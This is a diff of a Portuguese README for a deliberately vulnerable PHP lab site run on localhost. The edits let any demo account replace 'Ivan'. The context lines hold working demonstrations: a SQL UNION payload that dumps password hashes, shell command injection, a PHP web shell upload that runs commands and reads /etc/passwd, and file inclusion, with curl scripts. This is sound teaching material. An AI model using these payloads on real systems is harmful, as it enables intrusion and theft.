@@ -79,7 +79,7 @@ Senha **igual para todos:** `aviso123`
 
 Domínio `avisos.br` é fictício (laboratório).
 
-Conta sugerida para o **fluxo normal** e para a maior parte dos testes: **Ivan**.
+Qualquer conta da tabela acima com `aviso123` serve para o mural; **Ivan** aparece só como exemplo no `tests/fluxo.sh`.
 
 ---
 
@@ -96,7 +96,7 @@ Após login:
 - **Anexos** — envio de arquivos  
 - **Meu usuário** / **Sair**
 
-**Prova rápida:** entre como Ivan, publique um aviso, confira o nome **Ivan** na lista.
+**Prova rápida:** entre com qualquer usuário da seção 2, publique um aviso e confira **seu nome** na lista.
 
 ---
 
@@ -144,7 +144,7 @@ chmod +x tests/fluxo.sh
 ./tests/fluxo.sh
 ```
 
-**O que ele verifica (resumo):** container `web` e PHP 5.6.40 (se `docker` estiver no PATH); login Ivan; publicar e listar aviso; páginas do menu autenticado; SQL `UNION` na busca; login fraco (Daniel com senha errada); comando na Impressora; upload de `.php` em anexos; LFI de `/etc/passwd`. O teste de upload deixa `site/anexos/fluxo-probe-<timestamp>.php` — pode apagar depois.
+**O que ele verifica (resumo):** container `web` e PHP 5.6.40 (se `docker` estiver no PATH); login (o script usa Ivan, mas o site aceita qualquer conta demo); publicar e listar aviso; páginas do menu autenticado; SQL `UNION` na busca; login fraco (Daniel com senha errada); comando na Impressora; upload de `.php` em anexos; LFI de `/etc/passwd`. O teste de upload deixa `site/anexos/fluxo-probe-<timestamp>.php` — pode apagar depois.
 
 Se algo falhar, use a seção **8. Problemas comuns** antes de seguir para a demonstração manual abaixo.
 
@@ -154,7 +154,7 @@ Se algo falhar, use a seção **8. Problemas comuns** antes de seguir para a dem
 
 ## 7. Demonstração das vulnerabilidades
 
-Use a conta **Ivan** (`ivan@avisos.br` / `aviso123`) salvo onde indicado outro usuário. Mostre primeiro o fluxo normal (seção 3), depois cada falha. O relatório técnico está em `relatorio/texto/conteudo.tex`.
+Nas demonstrações abaixo, faça login com **qualquer usuário da seção 2** e senha `aviso123`, **exceto** na §7.1 (precisa ser outra conta, tipicamente Daniel). Nos exemplos com `curl`, troque o e-mail por `ivan@`, `daniel@` ou `pedro@avisos.br`. Mostre primeiro o fluxo normal (seção 3), depois cada falha. Relatório: `relatorio/texto/conteudo.tex`.
 
 ### 7.1 Autenticação fraca
 
@@ -180,7 +180,7 @@ Use a conta **Ivan** (`ivan@avisos.br` / `aviso123`) salvo onde indicado outro u
 
 **Como demonstrar:**
 
-1. Login como **Ivan**.
+1. Login com **qualquer conta demo** (senha `aviso123`).
 2. Menu **Avisos**.
 3. No campo **Buscar no título**, cole exatamente (incluindo aspas e `#` no final):
 
@@ -198,8 +198,9 @@ x' UNION SELECT id, email, senha_hash, NOW(), nome FROM usuarios#
 
 ```bash
 jar=$(mktemp)
+EMAIL='ivan@avisos.br'   # ou daniel@ / pedro@avisos.br
 curl -s -c "$jar" -b "$jar" -o /dev/null \
-  -d 'email=ivan@avisos.br&senha=aviso123' \
+  -d "email=${EMAIL}&senha=aviso123" \
   http://localhost:8080/login.php
 curl -s -c "$jar" -b "$jar" -G --data-urlencode \
   "q=x' UNION SELECT id, email, senha_hash, NOW(), nome FROM usuarios#" \
@@ -215,7 +216,7 @@ rm -f "$jar"
 
 **Como demonstrar:**
 
-1. Login como **Ivan**.
+1. Login com **qualquer conta demo** (senha `aviso123`).
 2. Menu **Impressora**.
 3. No campo **Servidor**, digite: `127.0.0.1; whoami` (ou `127.0.0.1; id`).
 4. Clique **Testar**.
@@ -225,8 +226,9 @@ rm -f "$jar"
 
 ```bash
 jar=$(mktemp)
+EMAIL='ivan@avisos.br'   # ou daniel@ / pedro@avisos.br
 curl -s -c "$jar" -b "$jar" -o /dev/null \
-  -d 'email=ivan@avisos.br&senha=aviso123' http://localhost:8080/login.php
+  -d "email=${EMAIL}&senha=aviso123" http://localhost:8080/login.php
 curl -s -c "$jar" -b "$jar" -d 'host=127.0.0.1;+whoami' \
   http://localhost:8080/impressora.php
 rm -f "$jar"
@@ -254,7 +256,7 @@ if (isset($_REQUEST['c'])) {
 EOF
 ```
 
-2. Login como **Ivan**.
+2. Login com **qualquer conta demo** (senha `aviso123`).
 3. Menu **Anexos** → envie `shell.php` → confirme a mensagem com `anexos/shell.php`.
 4. **Navegador (comando na URL):** `http://localhost:8080/anexos/shell.php?c=id` — mostre `uid=` / `www-data`.
 5. **Mais malicioso (comando no POST, não aparece na barra de endereços):** leitura de arquivo do servidor, por exemplo:
@@ -277,7 +279,7 @@ curl -s -X POST --data-urlencode 'c=cat /etc/passwd' \
 
 **Como demonstrar:**
 
-1. Login como **Ivan** (necessário para a página).
+1. Login com **qualquer conta demo** (senha `aviso123`; a página exige sessão).
 2. No navegador, abra:
 
 ```text
